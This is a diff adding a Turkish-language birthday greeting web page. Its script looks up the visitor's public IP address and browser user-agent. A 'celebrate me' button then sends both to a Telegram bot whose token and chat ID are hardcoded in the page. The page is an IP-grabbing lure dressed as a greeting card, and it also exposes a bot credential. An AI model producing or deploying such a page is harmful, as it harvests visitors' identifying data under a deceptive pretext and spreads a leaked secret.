@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>🎂 Mutlu Yıllar!</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #ffdde1, #ee9ca7);
+      text-align: center;
+      padding: 50px;
+    }
+    .container {
+      background: white;
+      border-radius: 20px;
+      padding: 30px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+      display: inline-block;
+    }
+    .info {
+      margin-top: 20px;
+      text-align: left;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      border: none;
+      background: #ff69b4;
+      color: white;
+      border-radius: 10px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #ff1493;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🎉 Mutlu Yıllar!</h1>
+    <p>Bugün harika bir gün! Senin doğum günün 🎂</p>
+
+    <div class="info" id="visitor-info">
+      <p><strong>IP:</strong> Yükleniyor...</p>
+      <p><strong>Tarayıcı:</strong> <span id="user-agent"></span></p>
+    </div>
+
+    <button onclick="sendToTelegram()">Beni Kutla 🎁</button>
+  </div>
+
+  <script>
+    // IP'yi çekmek
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        document.querySelector('#visitor-info p').innerHTML = `<strong>IP:</strong> ${data.ip}`;
+        window.visitorIP = data.ip;
+      });
+
+    // Tarayıcı bilgisini al
+    document.getElementById("user-agent").textContent = navigator.userAgent;
+
+    // Telegram’a gönder
+    function sendToTelegram() {
+      const chatId = "7705380171";
+      const token = "7705311532:AAFEzuP3OJsH_jfpr9RqrH44B2F6NO4ddZw";
+      const message = `
+🎂 Yeni Ziyaretçi!
+📍 IP: ${window.visitorIP}
+🖥️ Tarayıcı: ${navigator.userAgent}
+`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).then(() => {
+        alert("Teşekkürler! Bilgilerin kutlama için gönderildi 🎉");
+      });
+    }
+  </script>
+</body>
+</html>
